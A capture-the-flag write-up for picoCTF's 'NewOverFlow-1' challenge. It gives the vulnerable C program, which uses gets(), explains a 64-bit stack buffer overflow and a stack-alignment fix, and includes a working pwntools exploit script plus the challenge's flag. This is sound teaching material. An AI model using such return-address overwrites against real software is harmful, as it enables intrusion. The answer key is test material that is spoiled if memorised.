# NewOverFlow-1: Points: 200

Note: I was not able to solve this challenge during the CTF.
I decided to revisit this challenge afterwards, once I had learned more about binary exploitation.
It seemed like a relatively simple task, so at first, I wasn't sure why my payload was failing to produce a flag.
Some research led me to the issue of stack misalignment, the solution to which is demonstrated in this writeup.

## description

Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this [program](./vuln). You can find it in /problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123 on the shell server. [Source](./vuln.c).

## solution

This challenge is very similar to OverFlow 1, however, it is slightly complicated by the fact that it is a 64-bit program.
Regardless, the goal is still to overwrite the return address and call the ```flag()``` function.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}
```

We know that the buffer size is 64 bytes, and that 8 bytes will be reserved for the RBP, therefore, we can include padding of 72 bytes and start writing our recognisable pattern.
This time, it is ideal to use 8-character chunks as opposed to 4-character chunks, so the string might look like AAAAAAAABBBBBBBBCCCCCCCC...

If we run the program in GDB and check the value if RBP, we'll find that its been overwritten with whichever character was used for padding.
Using this, we know that the return address is begin overwritten with 0x4141414141414141.

We're able to call the ```flag()``` function successfully, however, the program throws a segmentation fault error when trying to print the flag.
This is because the 72-byte payload offset the call stack so that it was no longer a multiple of 16 bytes.

To resolve this, we can remove 8 bytes from the stack by having the function first return to the last line of itself, essentially calling `ret` twice, and writing the address of ```flag()``` directly after that.

## exploit script

This script is similar to the script from OverFlow 1, however, it uses the ```p64()``` function to format the addresses for a 64 bit program.

Note that the address of the last instruction of the ```vuln()``` is our first return address.
As the instruction here is a `ret` instruction, it will immediately read the next value on the stack and return to it, this being the address of the ```flag()``` function.

```py
#!/usr/bin/python
from pwn import *
from getpass import getpass

pico_user = input("Username: ")[:-1]
pico_pass = getpass("Password: ")

conn = ssh(host = '2019shell1.picoctf.com', user = pico_user, password = pico_pass)

location = '/problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123'

print("running vuln")
vuln = conn.process(location + '/vuln', cwd = location)
print(vuln.recvline())

print("sending payload")
vuln.sendline(('A'*72).encode() + p64(0x00000000004007e7) + p64(0x0000000000400767) + '\n'.encode())

print("done")
vuln.interactive()
```

Flag: ```picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_7a154fef}```

